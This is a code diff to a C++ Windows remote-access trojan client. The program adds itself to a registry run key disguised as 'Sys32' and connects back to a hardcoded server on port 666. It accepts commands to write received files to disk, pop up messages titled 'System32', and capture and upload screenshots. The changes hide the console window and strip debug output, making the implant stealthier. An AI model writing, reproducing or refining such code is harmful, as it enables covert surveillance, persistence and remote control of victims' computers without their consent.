@@ -10,7 +10,7 @@
 
 #define PORT 666
 #define SERVERADDR "192.168.1.69"
-//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
 
@@ -19,21 +19,23 @@ static const GUID png =
 
 using namespace std;
 
+bool checkend(char *arr, int len) {
+	for (int i = 0; i < len - 3; i++) {
+		if (arr[i] != '\0')return true;
+	}
+	return false;
+}
+
 int main(int argc, char* argv[])
 {
-	//
-	//HWND hWnd = GetConsoleWindow();
-	//ShowWindow(hWnd, SW_HIDE);
-	while (1){
+	while (1) {
 	char buffer2[256] = "";
 	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
 	char dir[FILENAME_MAX];
 	_getcwd(dir, sizeof(dir));
 	char temp[] = "\\C.exe";
-	cout << temp << " " << dir;
 
 	strcat_s(dir, temp);
-	cout << dir << endl;
 	DWORD dwtype = 0;
 	DWORD dwBufsize = sizeof(dir);
 	TCHAR szpath[MAX_PATH];
@@ -43,18 +45,14 @@ int main(int argc, char* argv[])
 		RegSetValueEx(hKeys, "Sys32", 0, REG_SZ, reinterpret_cast<const BYTE*>(&buffer2), sizeof(buffer2));
 		RegCloseKey(hKeys);
 	}
-	//
 	setlocale(LC_ALL, "rus");
 	char buff[1024];
 	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
 		buff[i] = '\0';
 	}
-	//printf("TCP DEMO CLIENT\n");
-
 
 	if (WSAStartup(0x202, (WSADATA *)&buff[0]))
 	{
-		printf("WSAStart error %d\n", WSAGetLastError());
 		return -1;
 	}
 
@@ -62,8 +60,6 @@ int main(int argc, char* argv[])
 	my_sock = socket(AF_INET, SOCK_STREAM, 0);
 	if (my_sock < 0)
 	{
-		printf("Socket() error %d\n", WSAGetLastError());
-		system("pause");
 		return -1;
 	}
 
@@ -84,25 +80,19 @@ int main(int argc, char* argv[])
 			((unsigned long **)hst->h_addr_list)[0][0];
 		else
 		{
-			printf("Invalid address %s\n", SERVERADDR);
 			closesocket(my_sock);
 			WSACleanup();
-			system("pause");
 			return -1;
 		}
 	}
 
 	if (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr)))
 	{
-		printf("Connect error %d\n", WSAGetLastError());
 		while (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))) {
 			Sleep(5000);
 			if (!(connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))))break;
 		}
 	}
-
-	printf("Connected to %s\n", SERVERADDR);
-
 
 	int nsize;
 	while ((nsize = recv(my_sock, &buff[0], sizeof(buff) - 1, 0)) != SOCKET_ERROR)
@@ -110,31 +100,39 @@ int main(int argc, char* argv[])
 
 		buff[nsize] = 0;
 
-		//printf("Server => Client:%s", buff);
-
 		if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 's')) {
-			//std::cout << "Принимаю файл\n";
 			HANDLE hFile;
 			std::string result = buff + 4;
-			hFile = CreateFile(result.c_str(),  // имя файла
+			hFile = CreateFile(result.c_str(),
 				GENERIC_WRITE,
 				0,
 				NULL,
 				OPEN_ALWAYS,
 				FILE_ATTRIBUTE_NORMAL,
 				NULL);
+			const int bufsize = 1024;
 			DWORD dwBytesWritten;
 			while (1) {
-				char buff[1028] = "";
+				bool exit = false;
+				char buff[bufsize] = "";
 				int nbytes = recv(my_sock, buff, sizeof(buff), 0);
-				if ((buff[0] == '@') && (buff[1] == '@') && (buff[2] == '^'))break;
-				WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
 				if (nbytes == 0) {
 					break;
 				}
 				if (nbytes < 0)
 				{
 					break;
+				}
+				if ((buff[bufsize - 1] == '@') && (buff[bufsize - 2] == '@') && (buff[bufsize - 3] == '^')) {exit = true; }
+				if (exit) {
+					if (!checkend(buff, bufsize)) {
+						break;
+					}
+					WriteFile(hFile, buff, nbytes - 3, &dwBytesWritten, NULL);
+						break;
+				}
+				else {
+					WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
 				}
 			}
 			CloseHandle(hFile);
@@ -151,7 +149,6 @@ int main(int argc, char* argv[])
 		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')) {
 			std::string result = buff + 4;
-			std::cout << MessageBox(NULL, result.c_str(), "System32", MB_OK | MB_ICONWARNING);
 		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'c')) {
 			using namespace Gdiplus;
@@ -184,36 +181,37 @@ int main(int argc, char* argv[])
 				if (!end) {
 					int b = fread(bufer, 1, sizeof(bufer), in1);
 					if (b < buflen - 2) {
-						cout << "b < buflen - 2\n";
 						bufer[buflen - 1] = '@';
 						bufer[buflen - 2] = '@';
 						bufer[buflen - 3] = '^';
 						end2 = true;
 					}
 					else if (b == (buflen - 2)) {
-						cout << "b == buflen - 2\nend-TRUE\n";
+						bufer[buflen - 1] = '\0';
+						bufer[buflen - 2] = '\0';
+						end = true;
+					}
+					else if (b == (buflen - 1)) {
 						bufer[buflen - 1] = '\0';
 						end = true;
 					}
 					int size = ftell(in1);
 					if (b != 0) send(my_sock, bufer, buflen, 0);
-					if (end2) { cout << "edn2true"; break; }
+					if (end2) {break; }
 				}
 				else {
-					cout << "end-TRUE;";
 					bufer[buflen - 1] = '@';
 					bufer[buflen - 2] = '@';
+					bufer[buflen - 3] = '^';
 					send(my_sock, bufer, buflen, 0);
 					break;
 				}
 			}
 			fclose(in1);
 			remove("screen.png");
-			std::cout << MessageBox(NULL,"del", "System32", MB_OK | MB_ICONWARNING);
 
 		}
 	}
-	//printf("Recv error %d\n", WSAGetLastError());
 	closesocket(my_sock);
 	WSACleanup();
 }
